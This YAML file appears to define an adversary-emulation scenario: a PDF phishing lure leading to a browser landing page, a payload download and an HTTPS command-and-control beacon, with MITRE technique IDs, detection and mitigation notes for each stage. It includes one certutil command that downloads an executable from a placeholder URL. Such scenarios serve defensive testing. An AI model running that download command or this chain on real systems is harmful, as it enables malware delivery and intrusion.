name: "PDF → Web Exploitation → C2 Communication"
version: "1.0.0"
description: "PDF with malicious URL leads to web-based exploitation and C2 channel establishment"
category: "code-execution"
disclaimer: "Educational and research use only."

stages:
  - name: "PDF Delivery"
    type: "initial_access"
    description: "Send PDF with embedded malicious URL as financial lure"
    mitre_technique: "T1566.001"
    payload: "PDF with malicious URL/50000usd.pdf"
    detection: "PDF content analysis, embedded URL inspection"
    mitigation: "Sandbox PDFs, disable JavaScript in PDF readers"

  - name: "PDF Execution"
    type: "execution"
    description: "Target opens PDF, which renders URL or executes JavaScript"
    mitre_technique: "T1204.002"
    payload: "calc.exe (PoC)"
    detection: "PDF reader making network connections"
    mitigation: "Disable JavaScript in Adobe Reader: Preferences > JavaScript > uncheck Enable"

  - name: "Browser Exploitation Landing Page"
    type: "initial_access"
    description: "Malicious URL delivers browser exploitation or credential capture page"
    mitre_technique: "T1189"
    payload: "Web-based landing page"
    detection: "Unusual network connections post-PDF open, browser exploit patterns"
    mitigation: "Keep browser updated, enable enhanced phishing protection"

  - name: "Payload Download"
    type: "command_and_control"
    description: "Download implant/payload via certutil or PowerShell"
    mitre_technique: "T1105"
    payload: "certutil -urlcache -split -f [URL] payload.exe"
    detection: "certutil/PowerShell making outbound connections"
    mitigation: "Block browser spawning download tools, network controls"

  - name: "C2 Channel Establishment"
    type: "command_and_control"
    description: "Downloaded implant establishes HTTPS C2 channel"
    mitre_technique: "T1071.001"
    payload: "HTTPS beacon to C2 server"
    detection: "Regular beaconing pattern to external IP, unusual HTTPS traffic"
    mitigation: "DNS filtering, outbound HTTPS inspection, network anomaly detection"
